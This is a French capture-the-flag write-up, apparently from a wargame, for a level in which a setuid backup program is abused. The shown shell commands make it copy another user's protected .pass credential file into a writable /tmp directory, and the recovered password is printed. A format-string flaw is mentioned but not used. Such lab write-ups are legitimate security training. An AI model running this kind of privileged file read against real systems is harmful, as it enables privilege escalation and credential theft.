# Level 08

Cet executable est setuid sur le user level09.

```
$ l -la ~/
total 28
drwxrwx---+ 1 level09 users      80 Jun 17 16:26 backups/
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08*
$ echo "World" > hello
$ ./level08 hello
$ cat ./backups/hello
World
$ cat ./backups/.log
LOG: Starting back up: hello
LOG: Finished back up hello
```

Il demande de fournir un fichier en paramètre, et crée un dossier `backups` dans le répertoire courant s'il n'existe pas. Après avoir reçu un fichier et créé le dossier, il copie le fichier donné en paramètre et écrit dans le fichier ./backups/.log pour indiquer s'il a réussi à sauvegarder le fichier.

En lisant le code décompilé, on peut penser qu'il y a une faille au niveau de snprintf, car le nom du fichier est pris en paramètre format, mais on reste limité par la taille donnée dans le second paramètre.

Avant d'exploiter cette faille, nous avons essayé autre chose. Puisque le programme ouvre le fichier en tant qu'utilisateur level09, nous pourrions lui donner le chemin /home/users/level09/.pass.

```bash
~$ level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
~$ mkdir -p backups/home/users/level09
mkdir: cannot create directory `backups/home': Permission denied
~$
```

Cependant, cette tentative échoue avec une erreur indiquant qu'il ne peut pas écrire dans le fichier ./backups//home/users/level09/.pass. Nous pourrions penser à créer le dossier, mais nous n'avons pas la permission de créer des dossiers dans `backups`. Nous allons donc réessayer cette procédure dans le répertoire /tmp, où nous avons des permissions d'écriture.

```bash
/tmp$ /home/users/level08/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
/tmp$ mkdir -p backups/home/users/level09
/tmp$ /home/users/level08/level08 /home/users/level09/.pass
/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Et voilà ! Nous avons réussi à forcer le programme à lire un fichier sans avoir les permissions, dans le dossier courant ./backups. Si le dossier backups avait eu un chemin absolu dans le `home` ou ailleurs, cela aurait été beaucoup plus compliqué.
